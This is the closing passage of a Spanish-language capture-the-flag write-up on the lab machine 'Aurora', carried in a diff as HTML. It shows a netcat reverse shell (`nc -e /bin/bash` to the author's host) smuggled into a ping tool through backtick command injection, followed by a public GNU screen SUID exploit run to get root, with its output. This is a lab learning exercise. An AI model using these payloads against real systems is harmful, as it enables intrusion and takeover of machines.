+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">octet</span><span class="o">.</span><span class="n">isdigit</span><span class="p">()</span> <span class="ow">or</span> <span class="nb">int</span><span class="p">(</span><span class="n">octet</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="nb">int</span><span class="p">(</span><span class="n">octet</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><hr>
+<blockquote>
+<p>La función ping() verifica si la dirección IP ingresada contiene caracteres prohibidos, si contiene caracteres prohibidos muestra un mensaje de error y finaliza el programa. Si la dirección IP no contiene caracteres prohibidos, se ejecutará el comando. Por otro lado, el uso de comillas invertidas permite la expansión de comandos.</p>
+</blockquote>
+<p>Consigo pivotar de usuario <strong>www-data</strong> a <strong>doro</strong> de la siguiente forma.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@aurora:/home/doro$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
+</span></span><span class="line"><span class="cl">Enter an IP address: `nc -e /bin/bash 192.168.1.18 1234`
+</span></span></code></pre></div><p>Obtengo la shell de usuario doro.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 1234
+</span></span><span class="line"><span class="cl">listening on [any] 1234 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.14] 55376
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Script started, output log file is &#39;/dev/null&#39;.
+</span></span><span class="line"><span class="cl">doro@aurora:/opt/login-app$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=1000(doro) gid=1000(doro) groups=1000(doro)
+</span></span></code></pre></div><p>Hago una búsqeda de archivos con permisos <strong>SUID</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">doro@aurora:~$ find / -perm -4000 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/screen
+</span></span></code></pre></div><p>Verifico la versión del binario screen.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">doro@aurora:~$ /usr/bin/screen -v
+</span></span><span class="line"><span class="cl">Screen version 4.05.00 (GNU) 10-Dec-16
+</span></span></code></pre></div><p>Encuentro este <a href="https://www.exploit-db.com/exploits/41154">exploit</a> y obtengo el root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">doro@aurora:/tmp$ ./exploit.sh 
+</span></span><span class="line"><span class="cl">~ gnu/screenroot ~
+</span></span><span class="line"><span class="cl">[+] First, we create our shell and library...
+</span></span><span class="line"><span class="cl">/tmp/libhax.c: In function ‘dropshell’:
+</span></span><span class="line"><span class="cl">/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">    7 |     chmod(&#34;/tmp/rootshell&#34;, 04755);
+</span></span><span class="line"><span class="cl">      |     ^~~~~
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c: In function ‘main’:
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">    3 |     setuid(0);
+</span></span><span class="line"><span class="cl">      |     ^~~~~~
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">    4 |     setgid(0);
+</span></span><span class="line"><span class="cl">      |     ^~~~~~
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">    5 |     seteuid(0);
+</span></span><span class="line"><span class="cl">      |     ^~~~~~~
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">    6 |     setegid(0);
+</span></span><span class="line"><span class="cl">      |     ^~~~~~~
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+</span></span><span class="line"><span class="cl">    7 |     execvp(&#34;/bin/sh&#34;, NULL, NULL);
+</span></span><span class="line"><span class="cl">      |     ^~~~~~
+</span></span><span class="line"><span class="cl">/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
+</span></span><span class="line"><span class="cl">[+] Now we create our /etc/ld.so.preload file...
+</span></span><span class="line"><span class="cl">[+] Triggering...
+</span></span><span class="line"><span class="cl">&#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+</span></span><span class="line"><span class="cl">[+] done!
+</span></span><span class="line"><span class="cl">No Sockets found in /tmp/screens/S-doro.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Script started, output log file is &#39;/dev/null&#39;.
+</span></span><span class="line"><span class="cl">root@aurora:/etc# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root),1000(doro)
+</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la máquina Aurora.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
